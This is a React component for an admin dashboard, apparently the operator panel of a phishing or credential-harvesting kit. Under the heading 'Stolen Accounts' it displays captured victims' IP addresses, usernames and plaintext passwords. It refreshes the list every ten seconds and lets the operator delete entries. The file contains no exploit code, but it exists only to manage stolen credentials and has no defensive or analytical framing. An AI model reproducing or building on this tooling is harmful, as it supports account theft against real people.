import React, { Component, Fragment } from 'react';
import PropTypes from 'prop-types';
import dayjs from 'dayjs';
import withStyles from '@material-ui/core/styles/withStyles';

import Navbar from '../layout/Navbar';

import Card from '@material-ui/core/Card';
import CardHeader from '@material-ui/core/CardHeader';
import CardContent from '@material-ui/core/CardContent';
import Dialog from '@material-ui/core/Dialog';
import DialogTitle from '@material-ui/core/DialogTitle';
import DialogActions from '@material-ui/core/DialogActions';
import Typography from '@material-ui/core/Typography';
import CircularProgress from '@material-ui/core/CircularProgress';
import Alert from '@material-ui/lab/Alert';
import Table from '@material-ui/core/Table';
import TableContainer from '@material-ui/core/TableContainer';
import Paper from '@material-ui/core/Paper';
import TableRow from '@material-ui/core/TableRow';
import TableBody from '@material-ui/core/TableBody';
import TableCell from '@material-ui/core/TableCell';
import TableHead from '@material-ui/core/TableHead';
import DeleteIcon from '@material-ui/icons/Delete';
import Tooltip from '@material-ui/core/Tooltip';
import Button from '@material-ui/core/Button';
import TimeAgo from 'react-timeago';

import Transition from '../utils/SlideTransition';

import { logoutAdmin } from '../redux/actions/authActions';
import { connect } from 'react-redux';
import { deleteAccount, getAccounts } from '../redux/actions/accountActions';
import IconButton from '@material-ui/core/IconButton';

const styles = (theme) => ({
	...theme.globalStyles,
	table: {
		'&:nth-of-type(even)': {
		  backgroundColor: theme.palette.action.hover,
		}
	},
	tableRow: {
		backgroundColor: theme.palette.primary.light
	},
	tableCell: {
		color: theme.palette.primary.contrastText
	}
});

class AdminDash extends Component {
	state = {
		accounts: [],
		showDelete: false,
		currentSelectedItem: ""
	};

	logout = () => {
		this.props.logoutAdmin(this.props.history);
	};

	showDelete = id => {
		this.setState({ showDelete: true, currentSelectedItem: id });
	}

	closeDialog = () => {
		this.setState({ showDelete: false });
	};

	UNSAFE_componentWillReceiveProps(props) {
		if (props.accounts.accounts) {
			this.setState({ accounts: props.accounts.accounts });
			this.setState({ lastUpdate: new Date() });
		}
	}

	componentDidMount() {
		this.props.getAccounts();
		
		setInterval(() => {
			this.props.getAccounts(true);
		}, 10000);
	}

	render() {
		const {
			classes,
			accounts: { loading },
			UI: { errors }
		} = this.props;

		return (
			<Fragment>
				<Navbar logout={this.logout} loadAccounts={this.props.getAccounts} />
				<Dialog
					open={this.state.showDelete}
					onClose={this.closeDialog}
					TransitionComponent={Transition}
				>
					<DialogTitle>
						Are you sure you want to delete this account?
					</DialogTitle>
					<DialogActions>
						<Button onClick={this.closeDialog} style={{ color: 'red' }}>Close</Button>
						<Button 
							onClick={() => {
								this.props.deleteAccount(this.state.currentSelectedItem);
								this.closeDialog();
							}}
							color='primary'
						>
							Delete
						</Button>
					</DialogActions>
				</Dialog>
				<Card>
					<CardHeader
						title='Stolen Accounts'
						disableTypography
						component={Typography}
						variant='h5'
					/>
					{errors && errors.msg && (
						<Alert severity='error' style={{ marginRight: 15, marginLeft: 15 }}>
							{errors.msg}
						</Alert>
					)}
					{loading && errors === null ? (
						<CircularProgress
							size={75}
							style={{ marginTop: 10, marginBottom: 25 }}
							color='primary'
						/>
					) : (
						<CardContent>
							{this.state.accounts.length === 0 ? (
								<Alert
									severity='info'
									style={{ marginRight: 15, marginLeft: 15 }}
								>
									There are no accounts to list
								</Alert>
							) : (
								<TableContainer component={Paper}>
									<Table style={{ width: '100%' }} aria-label='Accounts'>
										<TableHead>
											<TableRow className={classes.tableRow}>
												<TableCell className={classes.tableCell}>Time</TableCell>
												<TableCell className={classes.tableCell} align='center'>IP</TableCell>
												<TableCell className={classes.tableCell} align='center'>Username</TableCell>
												<TableCell className={classes.tableCell} align='center'>Password</TableCell>
											</TableRow>
										</TableHead>
										<TableBody className={classes.table}>
											{this.state.accounts.map((account) => (
												<TableRow key={account._id}>
													<TableCell
														style={{ paddingLeft: 5 }}
														component='th'
														scope='row'
													>
														<Tooltip placement='top' title='Delete'>
															<IconButton onClick={() => this.showDelete(account._id)} style={{ marginRight: 5 }}>
																<DeleteIcon />
															</IconButton>
														</Tooltip>
														{dayjs(account.time)
															.locale('en')
															.format('MM-DD-YYYY hh:mm:ss A')}
													</TableCell>
													<TableCell align='center'>{account.ip}</TableCell>
													<TableCell align='center'>
														{account.username}
													</TableCell>
													<TableCell align='center'>
														{account.password}
													</TableCell>
												</TableRow>
											))}
										</TableBody>
									</Table>
								</TableContainer>
							)}
						</CardContent>
					)}
					<Typography style={{ marginBottom: 5 }} variant="body2">
						Last Updated <TimeAgo date={this.state.lastUpdate} />
					</Typography>
				</Card>
			</Fragment>
		);
	}
}

AdminDash.propTypes = {
	accounts: PropTypes.object.isRequired,
	UI: PropTypes.object.isRequired,
	getAccounts: PropTypes.func.isRequired,
	deleteAccount: PropTypes.func.isRequired,
	logoutAdmin: PropTypes.func.isRequired
};

const mapStateToProps = (state) => ({
	accounts: state.accounts,
	UI: state.UI
});

const mapActionsToProps = {
	getAccounts,
	deleteAccount,
	logoutAdmin
};

export default connect(mapStateToProps, mapActionsToProps)(withStyles(styles)(AdminDash));
